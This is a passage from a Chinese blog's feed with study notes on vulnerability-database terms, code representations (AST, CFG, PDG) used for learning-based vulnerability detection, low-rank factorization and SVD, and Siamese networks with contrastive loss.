id="cnvd">CNVD</h4><p>国家信息安全漏洞共享平台。是由国家计算机网络应急技术处理协调中心（简称CNCERT）联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的信息安全漏洞信息共享知识库。</p><h4 id="cnnvd">CNNVD</h4><p>中国国家信息安全漏洞库。是中国信息安全测评中心为切实履行漏洞分析和风险评估的职能，负责建设运维的国家信息安全漏洞库，为我国信息安全保障提供基础服务</p><h4 id="cvsscommon-vulnerability-scoring-system">CVSS(Common Vulnerability Scoring System)</h4><p>通用漏洞评分系统，行业公开标准，用来评测漏洞的严重程度，0-10分值越高越严重,美国国家漏洞数据库官网：<a href="https://nvd.nist.gov/vuln/search%E5%8F%AF%E6%9F%A5%E8%AF%A2CVE%E5%AF%B9%E5%BA%94CVSS%E5%88%86%E5%80%BC">https://nvd.nist.gov/vuln/search可查询CVE对应CVSS分值</a></p><p>PS：评分会受时间和空间影响，如随着时间推移，漏洞相关补丁越多，可被利用性越低；漏洞存在不同的环境，也会影响漏洞的威胁程度</p><h4 id="cpecommon-platform-enumeration">CPE（Common Platform Enumeration）</h4><p>以标准化方式为软件应用程序、操作系统及硬件命名的方法</p><h2 id="code-representation">Code Representation</h2><h4 id="code-tokens">Code Tokens</h4><p>代码标记是指程序中带有特定语义的词法标记。它们包括标识符（例如变量和函数名）、关键字、分隔符（例如标点符号和分隔符）和运算符（例如算术运算符和逻辑运算符）。通过词法解析，代码片段可以直接表示为一个序列或一组标记。</p><h4 id="ast">AST</h4><p>抽象语法树，是将代码元素组织成树结构的基本代码表示。树叶对应于主代码元素，如变量类型、符号和运算符，而非叶节点表示一组受限的代码结构，如表达式和循环。与词汇解析的代码标记相比，AST除了词汇信息外，还自然地体现了源代码的句法结构。</p><p>AST 是源代码的有序树表示结构。 通常，它是代码解析器用来理解程序的基本结构并检查语法错误的第一步表示。 因此，它构成了生成许多其他代码表示的基础，并且 AST V ast 的节点集包括本文使用的其余三种代码表示的所有节点。 从根节点开始，代码被分解为代码块、语句、声明、表达式等，最后分解为形成叶节点的主标记。 主要的AST节点如图所示。所有方框都是AST节点，第一行有具体代码，并注释了节点类型。 蓝色框是 AST 的叶节点，紫色箭头表示子父 AST 关系。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403062143171.png" alt="image-20240306214316124"></p><h4 id="cfg">CFG</h4><p>CFG或控制流图是一个有向图，其中每个节点表示语句的基本块，每条边表示函数内块之间的控制流。CFG是通过识别AST中的控制相关性来构建的。通常要求代码在功能上是完整的和可编译的，以精确地生成CFG。</p><p>CFG 描述了程序在执行期间可能遍历的所有路径。 路径选择由条件语句确定，例如 if、for 和 switch 语句。 在CFG中，节点表示语句和条件，它们通过有向边连接以指示控制的转移。  CFG 边缘在图 2 中用绿色虚线箭头突出显示。特别是，流程从入口开始并在出口结束，并且在 if 语句处派生出两条不同的路径。</p><h4 id="pdg">PDG</h4><p>程序依赖图，是代码的另一种图形表示，强调代码元素之间的数据和控制依赖关系。与CFG类似，它可以在AST的基础上构建。在构建过程中，某些代码细节被抽象，以更明确地揭示控制和数据依赖关系。</p><h4 id="cpg">CPG</h4><p>代码属性图，提出了一种更为综合的代码混合图表示，它集成了从AST、CFG和PDG导出的信息。</p><h4 id="数据流图-dfg">数据流图 (DFG)</h4><p>DFG 跟踪整个 CFG 中变量的使用情况。 数据流是面向变量的，任何数据流都涉及某些变量的访问或修改。 DFG 边表示对相同变量的后续访问或修改。 它在图 2 中用橙色双箭头表示，并在边缘标注了所涉及的变量。 例如，参数b既用在if条件中，又用在赋值语句中。 自然代码序列（NCS） 为了对源代码的自然顺序进行编码，我们使用 NCS 边来连接 AST 中的相邻代码标记。 这种编码的主要好处是保留源代码序列反映的编程逻辑。 NCS 边在图 2 中用红色箭头表示，连接 AST 的所有叶节点。</p><h4 id="参考文献">参考文献</h4><p>[1]Zhenzhou T ,Binhui T ,Jiajun L , et al.Enhancing vulnerability detection via AST decomposition and neural sub-tree encoding[J].Expert Systems With Applications,2024,238(PB):</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> 基本术语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>挑战与问题</title>
      <link href="/2023/12/16/Security/%E6%8C%91%E6%88%98%E4%B8%8E%E9%97%AE%E9%A2%98/"/>
      <url>/2023/12/16/Security/%E6%8C%91%E6%88%98%E4%B8%8E%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>已经开发了各种方法来检测漏洞（Cui et al.，2022），包括静态、动态、一致性分析和模糊方法。正如我们将在相关工作部分进一步深入研究的那样，TrVD属于静态检测系列中基于学习的范式。在这种范式中，漏洞检测任务被公式化为一个分类问题。具体来说，在训练阶段，分类器 通过代码表示构建、特征提取和模型训练，从一组带有基本事实标签的训练样本中学习。在检测阶段，当出现一段可能看不见的源代码时, 执行代码表示构造和特征提取的相同过程。经过训练的分类器预测漏洞的存在，或者进一步精确定位特定的漏洞类型。</p><h2 id="可用性">可用性</h2><p>其他被广泛采用的代码表示包括CFG、PDG和各种基于图形的变体。这些表示更明确地描述了代码元素之间的控制或数据依赖关系，然而，当面对不可执行或不完整的代码片段时，很难精确推导出这些依赖关系。因此，它们可能并不总是适用于漏洞检测。按照约定，AST可以很容易地为任何代码片段构建，例如文件、函数或单个语句。</p><h2 id="效率">效率</h2><p>与需要相对复杂和耗时的控制或依赖性分析的代码表示（例如CFG、PDG和代码小工具）相比，从代码构建AST要简单得多，重量轻，从而有助于提高整个检测方法的效率。</p><h2 id="语义综合性">语义综合性</h2><p>那些人工创建的代码表示（例如，PDG和XFG）倾向于强调代码的特定方面，例如控制流或数据依赖关系。然而，它们经常在转换过程中丢失一些重要信息，这会导致语义损失，尤其是在表示不完整的代码片段时。不同的是，AST使源代码具有高度结构化的性质，其中关于语句和表达式的底层语法是直接可用的；也就是说，AST提供了更全面、更丰富、更精确的代码语义，使TrVD不遗漏任何可疑的漏洞含义，提高了检测的准确性。</p><p>[1]Zhenzhou T ,Binhui T ,Jiajun L , et al.Enhancing vulnerability detection via AST decomposition and neural sub-tree encoding[J].Expert Systems With Applications,2024,238(PB):</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低秩分解</title>
      <link href="/2023/12/16/AILearning/DL/%E4%BD%8E%E7%A7%A9%E5%88%86%E8%A7%A3/"/>
      <url>/2023/12/16/AILearning/DL/%E4%BD%8E%E7%A7%A9%E5%88%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="低秩分解的几何解释">低秩分解的几何解释</h1><p>低秩分解（Low-rank factorization）也可以通过几何的方式来解释，帮助我们理解其含义和应用。</p><p>假设我们有一个m×n的矩阵A，我们希望对其进行低秩分解，即将其分解为两个低秩矩阵的乘积：A ≈ UV^T。其中，U是一个m×k的矩阵，V是一个n×k的矩阵，k远远小于m和n。</p><p>几何上，可以将矩阵A视为描述一个向量空间中的点集。每一列可以看作是一个向量，而这些向量组成了一个n维的向量空间。低秩分解可以理解为通过两个低维的向量空间的点集的线性组合来近似表示原始向量空间中的点集。</p><p>具体地说，U矩阵的列向量可以看作是原始向量空间的基向量，它们将原始向量空间中的点集映射到一个低维的子空间。V矩阵的列向量则表示这个低维子空间中的基向量。通过对这两个子空间的基向量的线性组合，我们可以近似表示原始向量空间中的点集。</p><p>这个分解可以理解为以下几个几何步骤：</p><ol><li>U矩阵的列向量将原始向量空间中的点集映射到一个低维的子空间。这个子空间具有较低的维度k。</li><li>V矩阵的列向量表示这个低维子空间中的基向量，用于描述子空间中的点集。</li><li>通过对U和V的线性组合，将低维子空间中的点集映射回原始向量空间，近似重构出原始的点集。</li></ol><p>通过低秩分解，我们可以利用较低维度的向量空间来近似表示原始向量空间中的点集。这种近似表示可以在降低存储和计算成本的同时，尽可能地保留原始数据的主要结构和特征。</p><p>综上所述，几何视角可以帮助我们将低秩分解理解为通过两个低维子空间的基向量的线性组合来近似表示原始向量空间中的点集，从而实现对原始数据的降维和近似表示。这种几何解释有助于我们理解低秩分解的概念和原理。</p><h1 id="奇异值分解的几何理解"><a href="https://www.cnblogs.com/lukairui/p/17475145.html">奇异值分解的几何理解</a></h1><p>奇异值分解（SVD）可以通过几何的方式来解释，从而帮助我们理解其含义和应用。</p><p>首先，我们可以将一个矩阵视为对向量空间的一种变换。假设有一个m×n的矩阵A，其中每一列可以看作是一个向量，而这些向量组成了一个n维的向量空间。奇异值分解可以将这个向量空间的变换分解为三个基本的几何操作：旋转、缩放和再次旋转。</p><p>具体地说，奇异值分解将矩阵A分解为三个矩阵的乘积：A = UΣVT。其中，U是一个正交矩阵，表示一个旋转操作；Σ是一个对角矩阵，对角线上的元素是奇异值，表示一个缩放操作；VT是另一个正交矩阵，表示另一个旋转操作。</p><p>这个分解可以理解为以下几个几何步骤：</p><ol><li>U对应的旋转矩阵将原始向量空间进行旋转操作，使其与新的基向量相对应。</li><li>Σ对应的对角矩阵进行缩放操作，将每个基向量的长度进行缩放，即改变了向量空间的比例关系。</li><li>V^T对应的旋转矩阵将缩放后的向量空间进行进一步旋转操作，以使其与原始向量空间对齐。</li></ol><p>通过奇异值分解，我们可以将原始矩阵A分解为这三个操作的组合，从而更好地理解和描述原始矩阵A的结构和特征。</p><p>此外，奇异值分解还提供了一种基于奇异值的重要性排序。奇异值的大小表示了每个基向量在变换中的重要性。较大的奇异值对应的基向量在变换中具有更大的影响力，而较小的奇异值对应的基向量在变换中贡献较小。</p><p>综上所述，几何视角可以帮助我们将奇异值分解理解为对向量空间的旋转、缩放和再次旋转等几何操作的组合，从而更好地理解和应用奇异值分解的概念和原理。</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DL知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Siamese Network</title>
      <link href="/2023/12/16/AILearning/DL/siamese/"/>
      <url>/2023/12/16/AILearning/DL/siamese/</url>
      
        <content type="html"><![CDATA[<h2 id="siamese网络">Siamese网络</h2><h4 id="问题背景">问题背景</h4><p>分类问题：</p><ul><li><p>分类数量较少，每一类的数据量较多，比如ImageNet、VOC等。这种分类问题可以使用神经网络或者SVM解决，只要事先知道了所有的类。</p></li><li><p>分类数量较多（或者说无法确认具体数量），每一类的数据量较少，比如人脸识别、人脸验证任务。</p></li></ul><p>解决方法：</p><ul><li>提出一种思路：将输入映射为一个特征向量，使用两个向量之间的距离来表示输入之间的差异，如图像语义上的差异。</li><li>Siamese网络，每次需要输入两个样本作为一个sample对计算损失函数。</li><li>提出Contrastive Loss用于训练。</li></ul><h4 id="应用场景">应用场景</h4><p>孪生神经网络用于处理两个输入&quot;比较类似&quot;的情况。伪孪生神经网络适用于处理两个输入&quot;有一定差别&quot;的情况。比如，我们要计算两个句子或者词汇的语义相似度，使用siamese network比较适合；如果验证标题与正文的描述是否一致（标题和正文长度差别很大），或者文字是否描述了一幅图片（一个是图片，一个是文字），就应该使用pseudo-siamese network。也就是说，要根据具体的应用，判断应该使用哪一种结构，哪一种Loss。</p><h4 id="siamese创新点">Siamese创新点</h4><p>网络的创新点是淡化了标签，是的网络具有很好的扩展性，可以对那些没有训练过的类别进行分类，这一点优于很多算法。</p><p>该算法对一些小数据量的数据集也适用，变相地增加了整个数据集的大小，使得数据量相对较小的数据集也能用深度神经网络训练出不错的效果。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191528397.png" alt="image-20220104195309340"></p><p>不同输入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>X</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">X_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>X</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">X_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>通过统一<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>W</mi></msub></mrow><annotation encoding="application/x-tex">G_W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>得到两个向量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>W</mi></msub><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo stretchy="false">)</mo><msub><mi>G</mi><mi>W</mi></msub><mo stretchy="false">(</mo><msub><mi>X</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G_W(X_1)G_W(X_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，计算两个向量之间的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">L1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span><span class="mord">1</span></span></span></span>距离获得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>E</mi><mi>W</mi></msub></mrow><annotation encoding="application/x-tex">E_W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。<br>其中，两个network是两个共享权值的网络，实际上就是两个完全相同的网络。孪生神经网络有两个输入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">X1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord">1</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">X2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord">2</span></span></span></span>,将两个输入feed进入两个神经网络（Network1 and Network2），这两个神经网络分别将输入映射到新的空间，形成输入在新的空间中的表示。通过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mi>o</mi><mi>s</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">Loss</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span></span></span></span>的计算，评价两个输入的相似度。</p><p>如果左右两边不共享权值，而是两个不同的神经网络，叫做<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>s</mi><mi>e</mi><mi>u</mi><mi>d</mi><mi>o</mi><mo>−</mo><mi>s</mi><mi>i</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi>s</mi><mi>e</mi><mi>n</mi><mi>e</mi><mi>t</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">pseudo-siamese network</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">u</span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>，伪孪生神经网络。对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>s</mi><mi>e</mi><mi>u</mi><mi>d</mi><mi>o</mi><mo>−</mo><mi>s</mi><mi>i</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi>s</mi><mi>e</mi><mi>n</mi><mi>e</mi><mi>t</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">pseudo-siamese network</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">u</span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>，两边可以是不同的神经网络（如一个是lstm，一个是cnn），也可以是相同类型的神经网络。</p><h2 id="siamese的损失函数">Siamese的损失函数</h2><blockquote><p>Contrastive Loss</p></blockquote><h4 id="损失函数的选择">损失函数的选择</h4><p>Softmax当然是一种好的选择，但不一定是最优选择，即使是在分类问题中。传统的siamese network使用Contrastive Loss。损失函数还有更多的选择，siamese network的初衷是计算两个输入的相似度,。左右两个神经网络分别将输入转换成一个&quot;向量&quot;，在新的空间中，通过判断cosine距离就能得到相似度了。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mi>o</mi><mi>s</mi><mi>i</mi><mi>n</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Cosine</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span></span></span></span>是一个选择，<code>exp function</code>也是一种选择，欧式距离什么的都可以，<strong>训练的目标是让两个相似的输入距离尽可能的小，两个不同类别的输入距离尽可能的大。</strong></p><h4 id="论文中contrastive-loss">论文中Contrastive Loss</h4><p>论文中的损失函数定义如下：<br>Y代表<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>X</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">X_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>X</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">X_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是否属于同一类别。输入同一类别为0，不属于同一类别为1。<br>P代表输入数据数量。<br>i表示当前输入数据下标。<br><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mi>G</mi></msub></mrow><annotation encoding="application/x-tex">L_G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>代表两个输入数据属于同一类别时的损失函数（G，genuine）。<br><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mi>I</mi></msub></mrow><annotation encoding="application/x-tex">L_I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>代表两个输入数据不属于同一类别的损失函数（I，imposter）。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">L</mi><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>P</mi></munderover><mi>L</mi><mo stretchy="false">(</mo><mi>W</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>Y</mi><mo separator="true">,</mo><msub><mi>X</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>X</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mi>i</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{L}(W)=\sum_{i=1}^{P}L(W,(Y,X_{1},X_{2})^{i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathcal">L</span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.106005em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283360000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 